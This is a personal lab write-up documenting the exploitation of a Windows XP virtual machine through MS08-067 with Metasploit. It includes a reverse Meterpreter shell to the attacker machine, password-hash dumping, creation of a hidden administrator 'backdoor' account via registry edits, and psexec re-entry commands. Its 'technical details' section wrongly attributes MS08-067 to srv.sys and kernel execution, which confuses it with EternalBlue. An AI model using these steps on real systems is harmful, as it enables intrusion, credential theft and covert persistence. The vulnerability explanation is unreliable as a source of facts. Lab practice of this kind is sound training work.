# Ethical Hacking Lab: Goals and Achievements

## Objective

Build a self-directed penetration testing lab in an isolated VMware environment to gain practical experience across the full attack lifecycle: reconnaissance → vulnerability identification → exploitation → post-exploitation → persistence. Focus on understanding **why** exploits work, not just running them.

## Lab Environment

| Component | Specification |
|---|---|
| Hypervisor | VMware Workstation |
| Network | Custom virtual network (VMnet8), `192.168.108.0/24` |
| Attacker | Kali Linux (Rolling) — `192.168.108.128` |
| Target 1 | Windows 7 Home Basic SP1 x64 — `192.168.108.129` |
| Target 2 | Metasploitable2 — `192.168.108.130` |
| Target 3 | Windows 10 Home 22H2 — `192.168.108.131` |
| Target 4 | Windows XP SP3 x86 — `192.168.108.132` |
| Tools | Nmap 7.99, Metasploit Framework 6.4.135-dev, John the Ripper, msfvenom |

---

## Lab 5: Windows XP SP3 — MS08-067 (Conficker) Exploitation & Persistence

### Goals
1. Exploit an **older, pre-modern Windows** system showing how infrastructure degrades with age
2. Practice **persistent access** by creating a backdoor account that survives session death
3. Demonstrate why legacy OS support is a security liability

### Achievement ✅

**Recon:**
```bash
nmap -sV -O -p 445,139,135 192.168.108.132
```
Output:
```
PORT    STATE    SERVICE      VERSION
135/tcp filtered msrpc
139/tcp open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open     microsoft-ds Microsoft Windows XP microsoft-ds

OS Detection:
Device type: general purpose
Running: Microsoft Windows 2000|XP|2003
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Windows XP SP3 (92%), Windows XP SP2 or SP3 (91%)
```

**Vuln Confirmation:**
```bash
nmap --script smb-vuln-ms08-067 -p 445 192.168.108.132
```
Output:
```
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|     The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3,
|     Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 
|     Pre-Beta allows remote attackers to execute arbitrary code via a 
|     crafted RPC request that triggers the overflow during path canonicalization.
|     Disclosure date: 2008-10-23
|_      Risk factor: HIGH
```

**Exploitation:**
```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.108.132
msf exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.108.128
msf exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
msf exploit(windows/smb/ms08_067_netapi) > exploit
```

Execution log:
```
[*] Started reverse TCP handler on 192.168.108.128:4444 
[*] 192.168.108.132:445 - Automatically detecting the target...
[*] 192.168.108.132:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.108.132:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.108.132:445 - Attempting to trigger the vulnerability...
[*] Sending stage (199238 bytes) to 192.168.108.132
[*] Meterpreter session 1 opened (192.168.108.128:4444 -> 192.168.108.132:1041)
meterpreter >
```

**Technical Details of MS08-067:**
- **Vulnerability:** Integer overflow in `SrvOs2FeaListSizeToNt()` within `srv.sys` (SMB service driver)
- **Vector:** Crafted RPC request with malformed path specification during path canonicalization
- **Impact:** Stack-based buffer overflow → kernel-mode code execution
- **Why it works:** XP SP3's path canonicalization doesn't properly validate path length, leading to overflow into kernel stack
- **Exploitation:** Metasploit sends specially crafted SMB packets that overflow the buffer and overwrite return addresses
- **CVSS Score:** 8.3 (High)

**Post-Exploitation Verification:**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : CLIENTXP
OS              : Windows XP (5.1 Build 2600, Service Pack 3)
Architecture    : x86
System Language : en_US
Domain          : MSHOME
Logged On Users : 2

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
client:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:307521ab01560c5f4f08ba24bc4da7ae:6928ec8a23f43ab6ea3de2091ee6031e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:a500e5a50f99c5b078728f8025c25ff9:::
```

**Persistence — Creating Backdoor Account:**

From SYSTEM shell:
```
meterpreter > shell
Process 456 created.
Channel 1 created.

C:\WINDOWS\system32>net user backdoor P@ssw0rd123 /add
The command completed successfully.

C:\WINDOWS\system32>net localgroup administrators backdoor /add
The command completed successfully.

C:\WINDOWS\system32>reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
The operation completed successfully.

C:\WINDOWS\system32>net user backdoor
User name                    backdoor
Account active               Yes
Account expires              Never
Password last set            7/12/2026 2:52 AM
Local Group Memberships      *Administrators  *Users
```

**Persistence Mechanism:**
1. **Account creation** — `net user backdoor P@ssw0rd123 /add` creates local user
2. **Privilege escalation** — `net localgroup administrators backdoor /add` adds to admin group
3. **Hide from UI** — Registry key `UserList = 0` removes account from login screen but **account still works**
4. **Permanence** — Account stored in `%SystemRoot%\System32\config\SAM` (Security Account Manager); survives reboots

**Access Method (If original session dies):**
```bash
# From attacker machine, even if original Meterpreter crashes:
psexec.py -u backdoor -p "P@ssw0rd123" 192.168.108.132 cmd.exe
# or
meterpreter > use exploit/windows/smb/psexec
meterpreter > set SMBUser backdoor
meterpreter > set SMBPass P@ssw0rd123
```

### Key Insight
**Persistence transforms a temporary foothold into permanent access.** The MS08-067 exploit may crash the SMB service or system (inherent to buffer overflow exploits), but the backdoor account survives indefinitely. Professional attackers don't rely on a single shell — they establish multiple persistence mechanisms. Windows XP has been unsupported since 2014, yet vulnerabilities like this explain why legacy systems remain a liability: they're inherently exploitable, difficult to patch if critical services depend on them, and expensive to replace.

---

## Overall Progression & Skills Gained

| Stage | Skill | Lab(s) |
|---|---|---|
| **Reconnaissance** | Network enumeration, service identification, OS fingerprinting, Nmap scripting | All |
| **Vulnerability ID** | CVE research, NSE scripting, version detection, banner analysis | 1, 3, 5 |
| **Exploitation - Kernel** | Memory corruption (non-paged pool, buffer overflow), crash-tolerant retries | 1, 5 |
| **Exploitation - Supply Chain** | Backdoor detection, source verification, cryptographic signatures | 3 |
| **Credential Attacks** | Hash extraction (`hashdump`), offline cracking (John the Ripper), pass-the-hash, NTLM weaknesses | 2 |
| **Client-Side** | Payload generation (msfvenom), social engineering, user-level execution, HTTP delivery | 4 |
| **Privilege Escalation** | UAC bypass, trusted binary abuse (fodhelper.exe), integrity level manipulation | 4 |
| **Persistence** | Backdoor account creation, registry manipulation, hidden user accounts, account privileges | 5 |
| **Post-Exploitation** | Shell access, privilege verification, system enumeration, credential dumping | All |
| **Metasploit** | Module selection, listener configuration, multi-handler, exploit chaining, session management | All |

---

## Conclusions

### What Worked
- **Clear lab isolation** prevented any risk to production systems — a dedicated `VMnet8` network with no internet access
- **Progressive difficulty** (Win7 kernel exploit → Win10 modern defenses → XP legacy) demonstrated how threat landscapes evolve
- **Defense-in-depth observations** (Lab 2) provided as much learning as successful exploits — often more valuable
- **Hands-on Metasploit + command-line** experience is invaluable; understanding not just what commands to run, but why they work
- **Real-world attack chains:** Client-side payload + UAC bypass (Lab 4) mirrors actual 2020+ threats better than network RCE

### Technical Takeaways
1. **Exploit crashes are expected** — EternalBlue's lsass crashes aren't bugs; they're inherent to non-paged pool overflow exploitation. Attackers retry.
2. **Defense-in-depth works** — Lab 2 proved that one control isn't enough. Privilege level + account state + auth policy blocked everything.
3. **Modern Windows ≠ Old Windows** — EternalBlue (Win7) doesn't work on Win10 because SMBv1 is disabled, SMB is firewalled, and no unpatched network RCE path exists. The attack vector shifted to social engineering + local escalation.
4. **Persistence is the goal** — A Meterpreter session is temporary; backdoor accounts are permanent. Attackers think in terms of survival, not just access.
5. **Supply-chain risk is real** — vsftpd 2.3.4 backdoor shows that checking for patches is useless if the base software is compromised.
6. **Credential extraction is multi-step** — hashdump → offline cracking → pass-the-hash. Each step has different defenses, understanding all three is essential.

### Comparison: Legacy vs. Modern Attack Paths

| Aspect | Windows XP / Win7 | Windows 10+ |
|---|---|---|
| **Network RCE** | Available (EternalBlue, MS08-067) | Rare / disabled by default |
| **SMBv1** | Enabled, exploitable | Disabled, modern SMBv3 hardened |
| **Attack Entry** | Remote network exploit | Social engineering + local payload |
| **Privilege Level** | SYSTEM immediately (kernel exploit) | Standard user first, then escalation |
| **Escalation** | UAC can be bypassed silently (fodhelper) | Requires trusted binary abuse or 0-day |
| **Persistence** | Backdoor accounts, services | Backdoor accounts, scheduled tasks, WMI events |

### What This Means for Security
- **Legacy systems are not "secure if air-gapped"** — they're secure if truly isolated; one misconfiguration (like this lab network) is enough
- **Patching alone is insufficient** — even with patches, social engineering works if users run executables
- **Modern OS defenses work** — but attackers have adapted; they target users, not systems
- **Multi-layered defense wins** — one weak point (blank password, disabled account, SMBv1 enabled) can cascade into total compromise

### Next Steps
- **Red team:** Study Windows AD exploitation, Kerberos attacks, lateral movement with credential reuse
- **Blue team:** Set up IDS/IPS to detect exploit patterns (Nmap scanning, SMB overflow packets, suspicious registry edits)
- **Forensics:** Learn how to detect persistence mechanisms (registry artifacts, event log tampering, account creation)
- **Advanced labs:** HackTheBox / TryHackMe (Windows AD, Linux privilege escalation, Docker escapes)

---

## Environment Reproducibility

To reproduce this lab:

1. **VMware Workstation Setup:**
   ```bash
   # Create custom network
   VMware → Edit → Virtual Network Editor → Add Network → VMnet8 → Host-only → Subnet 192.168.108.0/24
   ```

2. **VM Network Configuration:**
   Each VM: VM Settings → Network Adapter → Custom (Specific virtual network) → VMnet8

3. **Static IP Assignment:**
   ```bash
   # Kali
   sudo ip addr add 192.168.108.128/24 dev eth0
   
   # Windows machines
   Control Panel → Network → IPv4 Properties → Static IP (192.168.108.x/255.255.255.0)
   ```

4. **Tool Installation (Kali):**
   ```bash
   sudo apt update && sudo apt full-upgrade -y
   sudo apt install -y nmap metasploit-framework john python3 curl
   msfdb init  # Initialize Metasploit database
   ```

---

*All activity documented in this report was performed exclusively against self-owned virtual machines in an isolated lab environment with no external network connectivity. No production systems, third-party networks, or public infrastructure were involved. This lab was created for educational purposes to understand penetration testing methodology and defensive measures.*

*Disclaimer: These techniques should only be practiced in authorized, isolated lab environments. Unauthorized access to computer systems is illegal.*

*Last updated: July 2026*
